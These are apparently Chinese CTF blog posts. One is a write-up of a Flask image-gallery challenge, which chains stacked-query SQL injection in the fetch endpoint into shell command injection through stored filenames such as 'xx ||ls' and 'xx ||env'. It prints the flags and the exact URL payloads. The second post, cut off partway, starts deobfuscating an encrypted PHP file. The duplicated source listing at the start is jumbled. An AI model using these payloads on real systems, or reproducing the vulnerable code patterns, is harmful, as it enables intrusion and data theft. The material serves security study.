class="line"><span class="keyword">def</span> <span class="title function_">getDb</span>():</span><br><span class="line">	<span class="keyword">return</span> MySQLdb.connect(host=<span class="string">&quot;localhost&quot;</span>, user=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;&quot;</span>, db=<span class="string">&quot;level5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">data</span>):</span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	cur.execute(<span class="string">&#x27;SELECT id, title FROM albums&#x27;</span>)</span><br><span class="line">	albums = <span class="built_in">list</span>(cur.fetchall())</span><br><span class="line"></span><br><span class="line">	rep = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">id</span>, title <span class="keyword">in</span> albums:</span><br><span class="line">		rep += <span class="string">&#x27;&lt;h2&gt;%s&lt;/h2&gt;\n&#x27;</span> % sanitize(title)</span><br><span class="line">		rep += <span class="string">&#x27;&lt;div&gt;&#x27;</span></span><br><span class="line">		cur.execute(<span class="string">&#x27;SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3&#x27;</span>, (<span class="built_in">id</span>, ))</span><br><span class="line">		fns = []</span><br><span class="line">		<span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">			rep += <span class="string">&#x27;&lt;div&gt;&lt;img src =&quot;fetch?id=%i&quot; width=&quot;266&quot; height=&quot;150&quot;&gt;&lt;br&gt;%s&lt;/div&gt;&#x27;</span> % (pid, sanitize(ptitle))</span><br><span class="line">			fns.append(pfn)</span><br><span class="line">		rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br><span class="line">		rep += <span class="string">&#x27;&lt;/div&gt;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> home.replace(<span class="string">&#x27;$ALBUMS$&#x27;</span>, rep)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fetch&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>():</span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	<span class="keyword">if</span> cur.execute(<span class="string">&#x27;SELECT filename FROM photos WHERE id=%s&#x27;</span> % request.args[<span class="string">&#x27;id&#x27;</span>]) == <span class="number">0</span>:</span><br><span class="line">		abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># It&#x27;s dangerous to go alone, take this:</span></span><br><span class="line">	<span class="comment"># from flask import Flask, abort, redirect, request, Response</span></span><br><span class="line"><span class="keyword">import</span> base64, json, MySQLdb, os, re, subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">home = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;Magical Image Gallery&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$ALBUMS$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">viewAlbum = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;$TITLE$ -- Magical Image Gallery&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;$TITLE$&lt;/h1&gt;</span></span><br><span class="line"><span class="string">$GALLERY$</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getDb</span>():</span><br><span class="line">	<span class="keyword">return</span> MySQLdb.connect(host=<span class="string">&quot;localhost&quot;</span>, user=<span class="string">&quot;root&quot;</span>, password=<span class="string">&quot;&quot;</span>, db=<span class="string">&quot;level5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">data</span>):</span><br><span class="line">	<span class="keyword">return</span> data.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	cur.execute(<span class="string">&#x27;SELECT id, title FROM albums&#x27;</span>)</span><br><span class="line">	albums = <span class="built_in">list</span>(cur.fetchall())</span><br><span class="line"></span><br><span class="line">	rep = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">id</span>, title <span class="keyword">in</span> albums:</span><br><span class="line">		rep += <span class="string">&#x27;&lt;h2&gt;%s&lt;/h2&gt;\n&#x27;</span> % sanitize(title)</span><br><span class="line">		rep += <span class="string">&#x27;&lt;div&gt;&#x27;</span></span><br><span class="line">		cur.execute(<span class="string">&#x27;SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3&#x27;</span>, (<span class="built_in">id</span>, ))</span><br><span class="line">		fns = []</span><br><span class="line">		<span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">			rep += <span class="string">&#x27;&lt;div&gt;&lt;img src =&quot;fetch?id=%i&quot; width=&quot;266&quot; height=&quot;150&quot;&gt;&lt;br&gt;%s&lt;/div&gt;&#x27;</span> % (pid, sanitize(ptitle))</span><br><span class="line">			fns.append(pfn)</span><br><span class="line">		rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br><span class="line">		rep += <span class="string">&#x27;&lt;/div&gt;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> home.replace(<span class="string">&#x27;$ALBUMS$&#x27;</span>, rep)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fetch&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>():</span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	<span class="keyword">if</span> cur.execute(<span class="string">&#x27;SELECT filename FROM photos WHERE id=%s&#x27;</span> % request.args[<span class="string">&#x27;id&#x27;</span>]) == <span class="number">0</span>:</span><br><span class="line">		abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># It&#x27;s dangerous to go alone, take this:</span></span><br><span class="line">	<span class="comment"># ^FLAG^273eec860065dd20d11dae90ecc962f862fbd13da66534f8ba8466f926fe95ee$FLAG$</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> file(<span class="string">&#x27;./%s&#x27;</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> file(<span class="string">&#x27;./%s&#x27;</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></div>
<p>nice 得到第一个flag</p>
<hr>
<h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>审计 <code>main.py</code> 第53行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>可以进行命令注入，前提是如果我们能控制列表fns中的项fn,例如:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fns=[&quot;xx || ls&quot;]</span><br></pre></td></tr></table></figure></div>

<p>则可以执行系统命令ls，可以怎么控制fns呢，继续往前看:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cur.execute(<span class="string">&#x27;SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3&#x27;</span>, (<span class="built_in">id</span>, ))</span><br><span class="line">fns = []</span><br><span class="line"><span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">    rep += <span class="string">&#x27;&lt;div&gt;&lt;img src =&quot;fetch?id=%i&quot; width=&quot;266&quot; height=&quot;150&quot;&gt;&lt;br&gt;%s&lt;/div&gt;&#x27;</span> % (pid, sanitize(ptitle))</span><br><span class="line">    fns.append(pfn)</span><br></pre></td></tr></table></figure></div>

<p>得知列表 <code>fns</code> 的项来自表 <code>photos</code> 中 <code>filename</code>，如果能够控制表 <code>photos</code> 中的 <code>filename</code> 就能最终进行代码注入，看59行开始的代码:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>():</span><br><span class="line">    cur = getDb().cursor()</span><br><span class="line">    <span class="keyword">if</span> cur.execute(<span class="string">&#x27;SELECT filename FROM photos WHERE id=%s&#x27;</span> % request.args[<span class="string">&#x27;id&#x27;</span>]) == <span class="number">0</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="comment"># It&#x27;s dangerous to go alone, take this:</span></span><br><span class="line">    <span class="comment"># ^FLAG^276c9cab4db9a0f361be2059933e1238ddac12c6b3c3ce867e736068284e9036$FLAG$</span></span><br><span class="line">    <span class="keyword">return</span> file(<span class="string">&#x27;./%s&#x27;</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>这边CSDN大佬给出的例子</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line"></span><br><span class="line">userid = “123”</span><br><span class="line">sql = “select id,name from user where id = ‘%s’” % userid</span><br><span class="line">cur.execute(sql)</span><br><span class="line"></span><br><span class="line">方式二：</span><br><span class="line"></span><br><span class="line">sql语句模板中的参数填充符是 %s 而不是 ‘%s’ ,且多个参数需要用元祖</span><br><span class="line">存放，单个参</span><br><span class="line">数可直接传递</span><br><span class="line"></span><br><span class="line">userid = “123”</span><br><span class="line">sql = &quot;“select id,name from user where id = %s and name =%s”</span><br><span class="line">cur.execute(sql, (‘123’, ‘云天明’))</span><br><span class="line"></span><br><span class="line">区别：</span><br><span class="line">方式一会存在sql注入的风险，方式二中用python内置的方法可以对sql语句中传入的参数进行校验，在一定程度上屏蔽掉sql注入，增加了sql的安全性，在不便直接使用sqlArchemy框架（底层实现也是调用的方式二）的情况下，建议选择方式二。</span><br></pre></td></tr></table></figure></div>


<p>这里 <code>cur.execute</code> 就是sql注入点发生的位置，通过控制 <code>request.args[&#39;id&#39;]</code> 达到控制sql过程，那么如果<code>execute函数</code> 支持 <code>sql堆叠查询</code>，我们不就可以控制表 <code>photos</code> 中的数据了么，我们先来测试一下吧,访问URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=1;update photos set title=&#x27;test&#x27; where id=1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>也就是让后台执行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cur.execute(<span class="string">&#x27;SELECT filename FROM photos WHERE id=1;update photos set title=&#x27;</span>test<span class="string">&#x27; where id=1;commit;--&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>然后访问主页：</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8wfnlj30ot0lkjz5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8wfnlj30ot0lkjz5.jpg" class="lazyload"></a></p>
<p>可以看到 <code>title</code> 被成功的改了过来，说明 <code>execute函数</code> 是支持堆叠查询的，那么就可以构造payload的，假如我要最终执行的命令是ls：<br>那么53行就应该是：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch files/xx ||ls || exit 0&#x27;</span>, shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>那么 <code>fns=[&quot;xx ||ls&quot;]</code><br>就是 <code>filename=&quot;xx ||ls&quot;</code><br>所以我们只要执行<code>update photos set filename=&#39;xx ||ls&#39; where id=1</code>，并且删除另外表<code>photos</code> 中另外两行 <code>delete from photos where id&lt;&gt;1</code>，就能保证最终<code>filename=&quot;xx ||ls&quot;</code>，我们来实践一下：依次访问URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=1;update photos set filename=&#x27;xx ||ls&#x27; where id=1;commit;--</span><br><span class="line">fetch?id=1;delete from photos where id&lt;&gt;1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>然后访问主页:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8inggj30mk0gj0t1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8inggj30mk0gj0t1.jpg" class="lazyload"></a></p>
<p>为什么只有一项，原因在第53行:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>结尾处的 <code>(...).strip().rsplit(&#39;n&#39;,1)[-1]</code> 使得结果只输出一行，怎么才能让结果全部输出呢，办法有多种，可以用 <code>... | tr -t &#39;n&#39; &#39;:&#39;</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8lnzzj30i708n3yl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8lnzzj30i708n3yl.jpg" class="lazyload"></a></p>
<p>先访问URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=1;update photos set filename=&quot;xx ||ls|tr -t &#x27;n&#x27; &#x27;:&#x27;&quot; where id=1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>在访问主页<br>最后发现flag居然在env环境变量里，<br>访问url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch?id=1;update photos set filename&quot;xx ||env|tr -t &#x27;n&#x27; &#x27;:&#x27;&quot; where id=1;commit;--</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8va1kj31gt0jcdsf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8va1kj31gt0jcdsf.jpg" class="lazyload"></a></p>
<p>然后得到了全部的flag<br>emmmmm</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析PHP混淆加密</title>
    <url>/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>通过一道题，来看一下php 混淆加密解密原理和分析<br>题目来自 [PWNHUB 公开赛 2018]傻 fufu 的工作日<br>这几天天天盯着这些鬼，眼睛都看瞎了<br>题目是个好题目，我看了Virink师傅和腹黑师傅的题解仍然发现自己很多不懂。还是太菜了<br>好好学习，好好学习</p>
<hr>
<h1 id="PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="[PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>[PWNHUB 公开赛 2018]傻 fufu 的工作日</h1><p>点开题目，是个上传，通过扫描后台，发现存在备份文件泄露，得到了 <code>index.php.bak</code><br>文件打开，发现全是乱码，但是注意到了一些细节因此我们来对源码进行一下分析</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" data-fancybox="group" data-caption="decode1" class="fancybox"><img alt="decode1" title="decode1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" class="lazyload"></a></p>
<p>首先是开头的加密源网站</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span></span><br></pre></td></tr></table></figure></div>

<p>然后可以看到有颜色的代码最末尾有 <code>return *** ?&gt;</code> 来结束脚本运行，这说明结束标签后面的数据都不会被正常输出，后面极可能是<code>index.php</code> 源码，而前面的 php 代码只是用来加密的。</p>
<hr>
<h2 id="解码准备"><a href="#解码准备" class="headerlink" title="解码准备"></a>解码准备</h2><p>因为我的 <code>IDE</code> 是 <code>VSCode</code>，所以安装了 <code>PHP Debug</code> 插件<br>以及需要进行代码缩进格式化<br>然后找到了这个<a href="https://github.com/nikic/PHP-Parser">工具PHP-Parser</a></p>
<p>使用工具前要先安装 <code>composer</code><br><a href="https://getcomposer.org/download/">composer下载地址</a><br><a href="https://developer.aliyun.com/composer">阿里云镜像</a></p>
<p>安装好 <code>composer</code> 后，进入下好的 <code>Parser</code> 文件夹，用命令输入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></div>

<p>让其生成所需要的库，然后将下面的代码保存成一个新的文件(例如 <code>format.php</code>)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> <span class="title class_">ParserFactory</span>)-&gt;<span class="title function_ invoke__">create</span>(<span class="title class_">ParserFactory</span>::<span class="variable constant_">PREFER_PHP7</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$ast</span> = <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$error</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Parse error: <span class="subst">&#123;$error-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$prettyPrinter</span> = <span class="keyword">new</span> <span class="title class_">PrettyPrinter\Standard</span>;</span><br><span class="line"><span class="variable">$prettyCode</span> = <span class="variable">$prettyPrinter</span>-&gt;<span class="title function_ invoke__">prettyPrintFile</span>(<span class="variable">$ast</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;index2.php&#x27;</span>, <span class="variable">$prettyCode</span>);</span><br></pre></td></tr></table></figure></div>

<p>然后执行命令 <code>php format.php</code><br>然后将新生成的文件，以 <code>Western (ISO 8859-1)</code> 编码形式打开，这样可以显示更多非可显示字符而不是多字节的字符集</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" data-fancybox="group" data-caption="decode2" class="fancybox"><img alt="decode2" title="decode2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode2.png" class="lazyload"></a></p>
<hr>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>开头两行需要先注释掉，防止调试过程出现一些问题</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>VSCode</code> 的调试功能，我们可以方便的查看变量的具体内容。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" data-fancybox="group" data-caption="decode3" class="fancybox"><img alt="decode3" title="decode3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode3.png" class="lazyload"></a></p>
<hr>
<h3 id="33行"><a href="#33行" class="headerlink" title="33行"></a>33行</h3><p>直到调试到这一行，发现直接跳出了。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" data-fancybox="group" data-caption="decode4" class="fancybox"><img alt="decode4" title="decode4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode4.png" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">php_sapi_name</span>() == <span class="string">&#x27;cli&#x27;</span> ? <span class="keyword">die</span>() : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>因为是用命令行运行调试，所以执行完这一句，程序就结束了。<br>然后将这一行注释掉，在他下面下断点。重新运行程序。</p>
<hr>
<p>34行是就是读取当前文件，这句话没有什么问题。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">constant</span>(<span class="string">&#x27;jnggfmpt&#x27;</span>));</span><br></pre></td></tr></table></figure></div>

<p>然后就又是验证运行环境。</p>
